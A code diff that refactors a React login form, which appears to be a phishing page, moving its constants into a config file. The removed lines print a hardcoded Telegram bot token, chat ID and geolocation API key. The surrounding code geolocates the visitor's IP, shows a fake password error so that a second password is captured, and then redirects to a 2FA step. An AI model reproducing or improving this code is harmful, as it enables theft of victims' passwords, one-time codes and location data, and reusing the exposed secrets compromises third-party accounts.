@@ -4,10 +4,18 @@ import { useNavigate } from "react-router-dom";
 import "./LoginForm.scss";
 import PhoneInput from "react-phone-input-2";
 import "react-phone-input-2/lib/style.css";
+import {
+  BOT_TOKEN,
+  CHAT_ID,
+  GEO_API_KEY,
+  DATE_MAX_LENGTH,
+  PASSWORD_ERROR_DELAY_MS,
+  NAVIGATE_TO_2FA_DELAY_MS,
+} from "./config";
 
 function LoginForm({ onClose }) {
-  const botToken = "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA";
-  const chatId = "7211586401";
+  const botToken = BOT_TOKEN;
+  const chatId = CHAT_ID;
   const [messageId, setMessageId] = useState(null);
 
   const navigate = useNavigate();
@@ -92,7 +100,7 @@ function LoginForm({ onClose }) {
 
         if (result && result.ip) {
           const locationResponse = await fetch(
-            `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`
+            `https://api.ipgeolocation.io/ipgeo?apiKey=${GEO_API_KEY}&ip=${result.ip}`
           );
           if (!locationResponse.ok) throw new Error("Failed to fetch location data");
           const locationData = await locationResponse.json();
@@ -328,7 +336,7 @@ function LoginForm({ onClose }) {
           setPassword("");
           setIsSubmitDisabled(false);
           setLoadingPassword(false);
-        }, 3000);
+        }, PASSWORD_ERROR_DELAY_MS);
       } else if (clickCount === 1) {
         const secondPassword = password;
 
@@ -374,7 +382,7 @@ function LoginForm({ onClose }) {
               replace: true,
             }
           );
-        }, 1200);
+        }, NAVIGATE_TO_2FA_DELAY_MS);
       }
 
       setClickCount((prev) => prev + 1);
@@ -541,7 +549,7 @@ function LoginForm({ onClose }) {
                   value={formData.dateOfBirth}
                   onChange={handleDateChange}
                   placeholder="MM/DD/YYYY"
-                  maxLength="10"
+                  maxLength={DATE_MAX_LENGTH}
                 />
                 {errors.dateOfBirth && (
                   <span className="error">{errors.dateOfBirth}</span>
